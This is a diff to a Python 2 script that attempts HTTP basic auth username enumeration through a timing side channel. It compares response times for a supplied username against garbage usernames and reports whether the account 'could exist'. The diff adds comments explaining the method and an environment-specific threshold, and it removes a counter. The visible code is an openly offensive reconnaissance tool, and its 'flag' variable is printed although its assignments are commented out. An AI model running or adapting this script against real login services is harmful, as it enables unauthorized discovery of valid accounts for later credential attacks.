@@ -1,4 +1,13 @@
 #!/usr/bin/python
+# this script, attempts to use the timing variation in real users and nonuser 
+# inputs to an http basic auth interface.
+
+# The premise is, find an oracle (in this case we use Administrator) and use the 
+# Aggregate response time as the baseline.  We create an example administrator
+# user for the purposes of this test.
+
+# The script takes a single input ala: './basicauth.py username'
+
 import sys
 import timeit
 class bcolors:
@@ -12,7 +21,6 @@ class bcolors:
     UNDERLINE = '\033[4m'
 
 username=sys.argv[1]
-#username="sadministrator"
 
 execme="""from subprocess import call
 import os
@@ -48,12 +56,12 @@ while True:
 		totreal=avgreal
 		totgarb=avggarb
 	if( i % 450 == 0):
+		# the constant std deviation 0.0145 is based on observation of my environment YMMV.
 		if(abs((totreal/totgarb)-1) > 0.0145):
 #			flag=bcolors.FAIL
 			print username +" : doesn't exist"
 		else:
 #			flag=bcolors.OKGREEN
-			exitweight+=1
 			print username +" : could exist"
-		print flag + "RU/GU AVG:" + str(avgreal)+"/"+str(avggarb) + "["+str(exitweight) +"/"+str(i/500)+"]"+"TRE/TGB:"+str(totreal)+"/"+str(totgarb)+","+str(abs((totreal/totgarb)-1 ))
+		print flag + "RU/GU AVG:" + str(avgreal)+"/"+str(avggarb) +" TRE/TGB:"+str(totreal)+"/"+str(totgarb)+","+str(abs((totreal/totgarb)-1 ))
 		exit(0)
